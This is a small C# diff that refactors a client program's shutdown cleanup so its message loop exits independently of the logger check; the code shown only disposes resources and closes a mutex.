@@ -39,11 +39,9 @@ namespace xClient
             if (CommandHandler.LastDesktopScreenshot != null)
                 CommandHandler.LastDesktopScreenshot.Dispose();
             if (Logger.Instance != null)
-            {
                 Logger.Instance.Dispose();
-                if (_msgLoop != null)
-                    _msgLoop.ExitThread();
-            }
+            if (_msgLoop != null)
+                _msgLoop.ExitThread();
             if (_appMutex != null)
                 _appMutex.Close();
 
